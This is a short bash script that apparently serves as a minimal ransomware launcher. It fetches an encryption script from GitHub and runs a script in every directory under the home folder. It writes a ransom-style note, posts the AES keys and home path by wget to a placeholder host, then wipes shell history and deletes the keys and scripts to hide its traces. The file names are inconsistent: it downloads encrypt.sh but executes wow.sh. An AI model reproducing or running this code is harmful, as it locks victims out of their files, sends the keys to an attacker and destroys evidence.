#!/bin/bash

wget -O /tmp/encrypt.sh https://raw.githubusercontent.com/drigg3r/Ransomware-Cpp-Bash-minimal/master/encrypt.sh > /dev/null 2>&1
chmod 777 /tmp/wow.sh > /dev/null 2>&1
find ~/ -type d -exec sh -c 'cd "{}" ; /tmp/wow.sh;' \; > /dev/null 2>&1
echo "HeHeHe All your home directory is encrypted with AES 256" > ~/OpenIt.txt
l=`cat /tmp/AesKey1.txt`
m=`cat /tmp/AesKey2.txt`
hd=`echo ~/`
wget --post-data "dir=$hd&Key1=$l&key2=$m" http://youwebsite.com/post.php > /dev/null 2>&1
history -c > /dev/null 2>&1
history -w > /dev/null 2>&1
rm ~/.bash_history > /dev/null 2>&1
rm /tmp/base.sh > /dev/null 2>&1
rm /tmp/encrypt.sh > /dev/null 2>&1
rm /tmp/AesKey1.txt > /dev/null 2>&1
rm /tmp/AesKey2.txt > /dev/null 2>&1

